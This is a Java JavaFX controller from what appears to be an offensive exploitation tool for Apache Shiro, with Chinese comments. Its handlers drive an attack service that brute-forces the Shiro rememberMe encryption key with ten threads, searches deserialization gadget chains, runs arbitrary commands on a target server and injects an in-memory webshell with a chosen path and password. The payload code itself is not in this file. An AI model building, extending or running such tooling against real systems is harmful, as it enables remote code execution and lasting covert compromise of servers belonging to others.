package com.liev.clouds.webcontroller.middleware;

import com.liev.clouds.exp.shiro.AttackService;
import com.liev.clouds.exp.shiro.ControllersFactory;
import com.liev.clouds.utils.shiroutils.KeyGenerator;
import com.liev.clouds.payload.shiro.util.Utils;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.control.*;
import javafx.scene.layout.StackPane;

import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ShiroController {
    @FXML
    public TextArea shellLog;

    @FXML
    private TextField url;

    @FXML
    private TextField timeOut;

    @FXML
    private ComboBox<String> requestMethod;

    @FXML
    private TextField requestHeader;

    @FXML
    private TextField requestBody;

    @FXML
    private TextField keyWord;

    @FXML
    public TextField specifyKey;

    @FXML
    private CheckBox encryption;

    @FXML
    public ComboBox<String> utilizeChain;

    @FXML
    public ComboBox<String> echoWay;

    @FXML
    public TextArea log;

    @FXML
    private TextField command;

    @FXML
    public TextArea executionResults;

    @FXML
    private ComboBox<String> shellType;

    @FXML
    private TextField shellPath;

    @FXML
    private TextField shellPassword;

    @FXML
    private TextArea keyLog;

    private AttackService attackService = null;

    @FXML
    public void initialize(){
        this.initComBoBox();
    }

    public ShiroController(){

    }


    public StackPane getContent() {
        try {
            FXMLLoader loader = new FXMLLoader(getClass().getResource("/fxml/Shiro.fxml"));
            return loader.load();
        } catch (IOException e) {
            e.printStackTrace();
            return new StackPane(); // Return an empty pane if loading fails
        }
    }

    public void initComBoBox(){
        requestMethod.getSelectionModel().selectFirst();
        utilizeChain.getSelectionModel().selectFirst();
        echoWay.getSelectionModel().selectFirst();
        shellType.getSelectionModel().selectFirst();
        ControllersFactory.controllers.put(ShiroController.class.getSimpleName(), this);

    }


    /**
     * 一键检测漏洞
     */
    @FXML
    void check(){
        crackKeyBtn(new ActionEvent());
        crackGadgetBtn(new ActionEvent());
    }


    /**
     * 内存马注入
     * @param event
     */
    @FXML
    void injectShellBtn(ActionEvent event) {
        // TODO 这里有bug，还没测试完

        String memShellType = this.shellType.getValue();
        String shellPass = this.shellPassword.getText();
        String shellPath = this.shellPath.getText();
        if (AttackService.gadget != null ) {
            this.attackService.injectMem(memShellType, shellPass, shellPath);
        } else {
            this.shellLog.appendText(Utils.log("请先获取密钥和构造链"));
        }

    }


    /**
     * 命令执行
     * @param event
     */
    @FXML
    void executeCmdBtn(ActionEvent event) {
//        String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
        if (AttackService.attackRememberMe != null) {
            String command = this.command.getText();
            if (!command.equals("")) {
                this.attackService.execCmdTask(command);
            } else {
                this.executionResults.appendText(Utils.log("请先输入获取的命令"));
            }
        } else {
            this.executionResults.appendText(Utils.log("请先获取密钥和构造链"));
        }

    }

    /**
     * 检测当前利用链
     * @param event
     */
    @FXML
    void crackSpcGadgetBtn(ActionEvent event) {
        String spcShiroKey = this.specifyKey.getText();
        if (this.attackService == null) {
            this.initAttack();
        }
        if (!spcShiroKey.equals("")) {
            boolean flag = this.attackService.gadgetCrack(this.utilizeChain.getValue(), this.echoWay.getValue(), spcShiroKey);
            if (!flag) {
                this.log.appendText(Utils.log("未找到构造链"));
            }
        } else {
            this.log.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
        }

    }

    /**
     * 发送请求模块
     */
    public void initAttack() {
        String shiroKeyWordText = this.keyWord.getText();
        String targetAddressText = this.url.getText();
        String httpTimeoutText = this.timeOut.getText();
        //自定义请求头
        Map<String, String> myheader= new HashMap<>() ;
        if(!this.requestHeader.getText().equals("")) {
            String headers[] = this.requestHeader.getText().split("&&&");
//        myheader(this.globalHeader.getText() -> this.globalHeader.getText().split(":"))
            for (int i = 0; i < headers.length; i++ ) {
                String header[] = headers[i].split(":", 2);
                if (header[0].toLowerCase().equals("cookie")) {
                    myheader.put("Cookie", header[1]);
                } else {
                    myheader.put(header[0], header[1]);
                }
            }
        }
//        this.globalHeader = myheader
        String postData = (String)this.requestBody.getText();
        String reqMethod = (String)this.requestMethod.getValue();
        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText,myheader,postData);
        if (this.encryption.isSelected()) {
            AttackService.aesGcmCipherType = 1;
        } else {
            AttackService.aesGcmCipherType = 0;
        }

    }

    /**
     * 爆破当前利用链
     * @param event
     */
    @FXML
    void crackGadgetBtn(ActionEvent event) {
        String spcShiroKey = this.specifyKey.getText();
        if (this.attackService == null) {
            this.initAttack();
        }

        boolean flag = false;
        if (!spcShiroKey.equals("")) {
            List<String> targets = this.attackService.generateGadgetEcho(this.utilizeChain.getItems(), this.echoWay.getItems());

            for(int i = 0; i < targets.size(); ++i) {
                String[] t = ((String)targets.get(i)).split(":");
                String gadget = t[0];
                String echo = t[1];
                flag = this.attackService.gadgetCrack(gadget, echo, spcShiroKey);
                if (flag) {
                    break;
                }
            }
        } else {
            this.log.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
        }

        if (!flag) {
            this.log.appendText(Utils.log("未找到构造链"));
        }

    }

    /**
     * 检测密钥
     * @param event
     */
    @FXML
    void crackSpcKeyBtn(ActionEvent event) {
        this.initAttack();
        if (this.attackService.checkIsShiro()) {
            String spcShiroKey = this.specifyKey.getText();
            if (!spcShiroKey.equals("")) {
                this.attackService.simpleKeyCrack(spcShiroKey);
            } else {
                this.log.appendText(Utils.log("请输入指定密钥"));
            }
        }

    }

    /**
     * 爆破密钥 实现多线程爆破，线程数为10
     * @param event
     */
    @FXML
    void crackKeyBtn(ActionEvent event) {
        if (this.attackService == null) {
            this.initAttack();
        }
        if (this.attackService.checkIsShiro()) {
            log.appendText(Utils.log("多线程爆破中.....当前线程数为10"));
            // 创建一个固定大小为10的线程池
            ExecutorService executorService = Executors.newFixedThreadPool(10);

            // 提交10个任务给线程池
            for (int i = 0; i < 10; i++) {
                executorService.submit(() -> {
                    this.attackService.keysCrack();
                });
            }

            // 关闭线程池，不再接受新任务
            executorService.shutdown();
        }
    }

    /**
     * 生成随机key
     * @param actionEvent
     */
    @FXML
    void keyTxt(ActionEvent actionEvent) {
        KeyGenerator keyGenerator = new KeyGenerator();
        String key = keyGenerator.getKey();
        this.keyLog.appendText(key);
        this.keyLog.appendText("\n");
    }
}

